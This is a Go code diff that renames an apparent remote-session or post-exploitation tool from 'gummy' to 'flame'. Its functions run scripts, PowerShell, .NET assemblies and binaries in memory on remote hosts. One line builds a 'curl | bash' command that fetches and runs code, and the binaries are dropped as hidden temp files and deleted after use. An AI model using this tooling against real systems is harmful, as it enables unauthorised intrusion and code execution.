@@ -99,14 +99,13 @@ func shouldUseWorkerForSpawn(platform string) bool {
 }
 
 // Directory retorna o diretório base da sessão
-// Formato: ~/.gummy/sessions/20260401-150405_IP_user/
+// Formato: ~/.flame/sessions/20260401-150405_IP_user/
 func (s *SessionInfo) Directory() string {
 	timestamp := s.CreatedAt.Format("20060102-150405")
 	whoami := sanitizePath(s.Whoami)
 	dirname := fmt.Sprintf("%s_%s_%s", timestamp, s.RemoteIP, whoami)
 
-	home, _ := os.UserHomeDir()
-	return filepath.Join(home, ".gummy", "sessions", dirname)
+	return appDataPath("sessions", dirname)
 }
 
 func (s *SessionInfo) newTransferer() *Transferer {
@@ -260,7 +259,7 @@ func (s *SessionInfo) RunScriptInMemory(ctx context.Context, scriptSource string
 		remoteCmd = fmt.Sprintf("curl -s '%s' | bash -s%s", httpURL, argsStr)
 	} else {
 		// B64: upload to variable, then execute
-		varName := fmt.Sprintf("_gummy_script_%d", time.Now().UnixNano())
+		varName := fmt.Sprintf("_flame_script_%d", time.Now().UnixNano())
 		if err := t.UploadToBashVariable(context.Background(), localPath, varName); err != nil {
 			if cleanup != nil {
 				cleanup()
@@ -352,9 +351,9 @@ func (s *SessionInfo) RunBinary(ctx context.Context, binarySource string, args [
 func buildRemoteBinaryPath(platform, localPath string, unixNano int64) string {
 	filename := filepath.Base(localPath)
 	if platform == "windows" {
-		return fmt.Sprintf(`C:\Windows\Temp\gummy_%d_%s`, unixNano, filename)
+		return fmt.Sprintf(`C:\Windows\Temp\flame_%d_%s`, unixNano, filename)
 	}
-	return fmt.Sprintf("/tmp/.gummy_%d_%s", unixNano, filename)
+	return fmt.Sprintf("/tmp/.flame_%d_%s", unixNano, filename)
 }
 
 func windowsNativeArgsLiteral(args []string) string {
@@ -372,13 +371,13 @@ func windowsNativeArgsLiteral(args []string) string {
 func buildWindowsBinaryCommand(remotePath string, args []string) string {
 	outputPath := remotePath + ".out.txt"
 	return fmt.Sprintf(`try {
-    $gummyOut = '%s'
-    & '%s'%s *> $gummyOut
-    if (Test-Path $gummyOut) {
-        Get-Content $gummyOut -Raw
+    $flameOut = '%s'
+    & '%s'%s *> $flameOut
+    if (Test-Path $flameOut) {
+        Get-Content $flameOut -Raw
     }
 } finally {
-    Remove-Item $gummyOut -Force -ErrorAction SilentlyContinue
+    Remove-Item $flameOut -Force -ErrorAction SilentlyContinue
     Remove-Item '%s' -Force -ErrorAction SilentlyContinue
 }`, outputPath, remotePath, windowsNativeArgsLiteral(args), remotePath)
 }
@@ -525,7 +524,7 @@ func (s *SessionInfo) RunPowerShellInMemory(ctx context.Context, scriptSource st
 	}
 
 	// Fallback: b64 variable upload (works without binbag)
-	varName := fmt.Sprintf("gummy_ps_%d", time.Now().UnixNano())
+	varName := fmt.Sprintf("flame_ps_%d", time.Now().UnixNano())
 
 	if err := t.UploadToPowerShellVariable(ctx, localPath, varName); err != nil {
 		return fmt.Errorf("upload to memory failed: %w", err)
@@ -597,7 +596,7 @@ func (s *SessionInfo) RunDotNetInMemory(ctx context.Context, assemblySource stri
 	}
 
 	// Fallback: b64 variable upload (works without binbag)
-	varName := fmt.Sprintf("gummy_asm_%d", time.Now().UnixNano())
+	varName := fmt.Sprintf("flame_asm_%d", time.Now().UnixNano())
 
 	if err := t.UploadToPowerShellVariable(ctx, localPath, varName); err != nil {
 		return fmt.Errorf("upload to memory failed: %w", err)
@@ -687,7 +686,7 @@ func (s *SessionInfo) RunPythonInMemory(ctx context.Context, scriptSource string
 		httpURL := GlobalRuntimeConfig.GetHTTPURL(filename)
 		remoteCmd = buildUnixPythonHTTPCommand(httpURL, args)
 	} else {
-		varName := fmt.Sprintf("_gummy_py_%d", time.Now().UnixNano())
+		varName := fmt.Sprintf("_flame_py_%d", time.Now().UnixNano())
 		if err := t.UploadToBashVariable(ctx, localPath, varName); err != nil {
 			return fmt.Errorf("upload to memory failed: %w", err)
 		}
@@ -2230,11 +2229,10 @@ func (m *Manager) ShellSession() error {
 // StartMenu inicia o loop do menu principal
 func (m *Manager) StartMenu() {
 	// Setup readline with history
-	homeDir, _ := os.UserHomeDir()
-	historyFile := filepath.Join(homeDir, ".gummy", "history")
+	historyFile := appDataPath("history")
 
-	// Create .gummy directory if it doesn't exist
-	os.MkdirAll(filepath.Join(homeDir, ".gummy"), 0755)
+	// Create flame data directory if it doesn't exist
+	os.MkdirAll(appDataPath(), 0755)
 
 	// Create completer
 	completer := &GummyCompleter{manager: m}
@@ -2534,11 +2532,10 @@ func (m *Manager) GetSessionLogDir() string {
 	if !hasLogs {
 		return ""
 	}
-	home, err := os.UserHomeDir()
-	if err != nil {
+	if _, err := os.UserHomeDir(); err != nil {
 		return ""
 	}
-	return filepath.Join(home, ".gummy", "sessions")
+	return appDataPath("sessions")
 }
 
 // HasActiveSessions returns true if there are any active sessions
@@ -3150,7 +3147,7 @@ func (m *Manager) CompleteInput(line string) string {
 	return line
 }
 
-// ExecuteCommand runs a gummy command and returns its text output.
+// ExecuteCommand runs a flame command and returns its text output.
 // This captures stdout from the existing handleCommand methods as a Phase 1
 // workaround until all output is refactored to return strings.
 func (m *Manager) ExecuteCommand(cmd string) string {
